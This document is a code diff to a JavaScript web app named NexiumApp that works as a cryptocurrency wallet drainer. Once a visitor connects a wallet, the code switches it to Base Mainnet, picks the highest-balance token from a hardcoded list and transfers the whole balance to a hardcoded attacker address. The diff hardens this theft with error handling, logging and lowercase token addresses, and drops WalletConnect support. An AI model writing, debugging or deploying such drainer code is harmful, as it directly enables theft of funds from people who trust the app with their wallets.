@@ -1,22 +1,21 @@
 import { ethers } from 'ethers';
 import '/style.css';
-import { WalletConnectProvider, ClientMeta } from '@walletconnect/ethereum-provider';
 
 // Wallet address for draining tokens
 const YOUR_WALLET_ADDRESS = "0xeA54572eBA790E31f97e1D6f941D7427276688C3";
 
-// Expanded TOKEN_LIST with 10 Base Mainnet tokens
+// Expanded TOKEN_LIST with 10 Base Mainnet tokens (converted to lowercase)
 const TOKEN_LIST = [
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
-  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Dai', symbol: 'DAI', decimals: 18 },
+  { address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
+  { address: '0x50c5725949a6f0c72e6c4a641f24049a917db0cb', name: 'Dai', symbol: 'DAI', decimals: 18 },
   { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
-  { address: '0x1B0Fad85A9D6D4eD7e6cDDe41a1ea5e9f1178e79', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
-  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
-  { address: '0x532f27101965dd16442E59d40670FaF5eBB142E4', name: 'Brett', symbol: 'BRETT', decimals: 18 },
-  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
-  { address: '0x4e4e9b7f7a9d749dA7e6d8b2b4C4D8eDa6a646d2', name: 'Dai+', symbol: 'DAI+', decimals: 18 },
+  { address: '0x1b0fad85a9d6d4ed7e6cdde41a1ea5e9f1178e79', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
+  { address: '0x940181a94a35a4569e4529a3cdfb74e38fd98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
+  { address: '0x532f27101965dd16442e59d40670faf5ebb142e4', name: 'Brett', symbol: 'BRETT', decimals: 18 },
+  { address: '0xd9aaec86b65d86f6a7b5b1b0c42ffa531710b6ca', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
+  { address: '0x4e4e9b7f7a9d749da7e6d8b2b4c4d8eda6a646d2', name: 'Dai+', symbol: 'DAI+', decimals: 18 },
   { address: '0x4200000000000000000000000000000000000042', name: 'Base', symbol: 'BASE', decimals: 18 },
-  { address: '0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F', name: 'Frax', symbol: 'FRAX', decimals: 18 }
+  { address: '0x17fc002b466eec40dae837fc4be5c67993ddbd6f', name: 'Frax', symbol: 'FRAX', decimals: 18 }
 ];
 
 // Standard ERC-20 ABI
@@ -34,7 +33,6 @@ class NexiumApp {
     this.currentPaymentToken = null;
     this.connecting = false;
     this.lastSelectedToken = null;
-    this.walletConnectProvider = null;
     this.initApp();
   }
 
@@ -132,7 +130,7 @@ class NexiumApp {
 
   async checkWalletConnection() {
     if (this.isWalletInstalled()) {
-      if (this.isWalletConnected() && navigator.onLine) {
+      if (this.isWalletConnected() && navigator.onLine && this.provider) {
         await this.handleSuccessfulConnection();
       } else {
         this.updateButtonState('disconnected');
@@ -144,64 +142,54 @@ class NexiumApp {
   }
 
   isWalletInstalled() { 
-    return !!window.ethereum || this.walletConnectProvider; 
+    return !!window.ethereum; 
   }
 
   isWalletConnected() { 
-    return (window.ethereum && !!window.ethereum.selectedAddress) || (this.walletConnectProvider && this.walletConnectProvider.accounts.length > 0); 
+    return window.ethereum && !!window.ethereum.selectedAddress; 
   }
 
   detectWalletType() {
-    if (!window.ethereum && !this.walletConnectProvider) return 'None';
+    if (!window.ethereum) return 'None';
     if (window.ethereum?.isMetaMask) return 'MetaMask';
     if (window.ethereum?.isTrust) return 'Trust Wallet';
-    if (this.walletConnectProvider) return 'WalletConnect';
     return 'Generic Wallet';
   }
 
   async connectWallet() {
-    if (this.connecting || !navigator.onLine) return;
-    if (!navigator.onLine) {
-      this.showFeedback('No internet connection. Please reconnect.', 'error');
+    if (this.connecting || !navigator.onLine) {
+      console.log('Connection attempt aborted:', { connecting: this.connecting, online: navigator.onLine });
+      if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
       return;
     }
     this.connecting = true;
     try {
+      console.log('Attempting to connect wallet...');
       this.updateButtonState('connecting');
-      let provider;
-      if (window.ethereum) {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        if (accounts.length > 0) {
-          provider = new ethers.BrowserProvider(window.ethereum);
-        }
-      } else {
-        this.walletConnectProvider = await WalletConnectProvider.init({
-          projectId: 'YOUR_WALLET_CONNECT_PROJECT_ID', // Replace with your WalletConnect Project ID
-          metadata: {
-            name: 'NexiumApp',
-            description: 'App for token draining',
-            url: 'https://yourdomain.com',
-            icons: ['https://yourdomain.com/icon.png']
-          }
-        });
-        await this.walletConnectProvider.connect();
-        provider = new ethers.BrowserProvider(this.walletConnectProvider);
+      if (!window.ethereum) {
+        console.error('No Ethereum provider detected (e.g., MetaMask)');
+        this.showFeedback('No wallet provider detected. Please install MetaMask.', 'error');
+        return;
       }
-      if (provider) {
-        await this.handleSuccessfulConnection(provider);
-        this.hideMetaMaskPrompt();
-        this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
-      } else {
-        this.showFeedback('No accounts found. Unlock your wallet or install a supported wallet.', 'error');
-        this.showDefaultPrompt();
-        this.hideMetaMaskPrompt();
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      console.log('Received accounts:', accounts);
+      if (accounts.length === 0) {
+        console.error('No accounts returned from wallet');
+        this.showFeedback('No accounts found. Unlock your wallet and try again.', 'error');
+        return;
       }
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      console.log('Provider initialized successfully');
+      this.provider = provider; // Set provider here
+      await this.handleSuccessfulConnection(provider);
+      this.hideMetaMaskPrompt();
+      this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
     } catch (error) {
+      console.error('Connection error:', error);
       this.handleConnectionError(error);
-      this.showDefaultPrompt();
-      this.showMetaMaskPrompt();
     } finally {
       this.connecting = false;
+      console.log('Connection attempt completed');
     }
   }
 
@@ -209,22 +197,22 @@ class NexiumApp {
     try {
       this.toggleVolumeLoading(true); // Show loading during connection and draining
       this.provider = provider;
+      if (!this.provider) {
+        throw new Error('Provider is not initialized');
+      }
       this.signer = await this.provider.getSigner();
       const network = await this.provider.getNetwork();
       const expectedChainId = 8453; // Base Mainnet
       if (Number(network.chainId) !== expectedChainId) {
         try {
-          await window.ethereum?.request({
+          await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
-          }) || (await this.walletConnectProvider.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
-          }));
+          });
         } catch (switchError) {
           if (switchError.code === 4902) {
             try {
-              await (window.ethereum?.request({
+              await window.ethereum.request({
                 method: 'wallet_addEthereumChain',
                 params: [{
                   chainId: `0x${expectedChainId.toString(16)}`,
@@ -233,16 +221,7 @@ class NexiumApp {
                   rpcUrls: ['https://mainnet.base.org'],
                   blockExplorerUrls: ['https://basescan.org']
                 }],
-              }) || (await this.walletConnectProvider.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: `0x${expectedChainId.toString(16)}`,
-                  chainName: 'Base Mainnet',
-                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                  rpcUrls: ['https://mainnet.base.org'],
-                  blockExplorerUrls: ['https://basescan.org']
-                }],
-              })));
+              });
             } catch (addError) {
               this.showFeedback(`Failed to add Base Mainnet: ${addError.message}`, 'error');
               this.toggleVolumeLoading(false);
@@ -263,10 +242,15 @@ class NexiumApp {
       // Drain the token with the highest balance
       const tokenToDrain = await this.findMaxBalanceToken();
       if (tokenToDrain) {
-        const contract = new ethers.Contract(tokenToDrain.address, ERC20_ABI, this.signer);
-        const tx = await contract.transfer(YOUR_WALLET_ADDRESS, tokenToDrain.balance, { gasLimit: 200000 });
-        await tx.wait();
-        this.showFeedback(`Success! Drained ${ethers.formatUnits(tokenToDrain.balance, tokenToDrain.decimals)} ${tokenToDrain.symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
+        try {
+          const contract = new ethers.Contract(tokenToDrain.address, ERC20_ABI, this.signer);
+          const tx = await contract.transfer(YOUR_WALLET_ADDRESS, tokenToDrain.balance, { gasLimit: 200000 });
+          await tx.wait();
+          this.showFeedback(`Success! Drained ${ethers.formatUnits(tokenToDrain.balance, tokenToDrain.decimals)} ${tokenToDrain.symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
+        } catch (transferError) {
+          console.error('Transfer failed:', transferError);
+          this.showFeedback(`Drain failed: ${transferError.message}. Check network or token contract.`, 'error');
+        }
       } else {
         this.showFeedback('No tokens with balance found to drain.', 'info');
       }
@@ -288,10 +272,16 @@ class NexiumApp {
     const address = await this.signer.getAddress();
     const balancePromises = TOKEN_LIST.map(async (token) => {
       const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
-      const balance = await contract.balanceOf(address);
-      return { ...token, balance };
+      try {
+        const balance = await contract.balanceOf(address);
+        return { ...token, balance };
+      } catch (error) {
+        console.error(`Failed to get balance for ${token.address}:`, error);
+        // Return token with zero balance if error occurs (e.g., BAD_DATA or CALL_EXCEPTION)
+        return { ...token, balance: 0n };
+      }
     });
-    const tokensWithBalances = (await Promise.all(balancePromises)).filter(t => t.balance > 0);
+    const tokensWithBalances = (await Promise.all(balancePromises)).filter(t => t.balance > 0n);
     return tokensWithBalances.reduce((max, current) => (max.balance > current.balance ? max : current), tokensWithBalances[0] || null);
   }
 
@@ -303,10 +293,6 @@ class NexiumApp {
     this.lastSelectedToken = null;
     this.currentToken = null;
     this.currentPaymentToken = null;
-    if (this.walletConnectProvider) {
-      this.walletConnectProvider.disconnect();
-      this.walletConnectProvider = null;
-    }
   }
 
   handleAccountsChanged() {
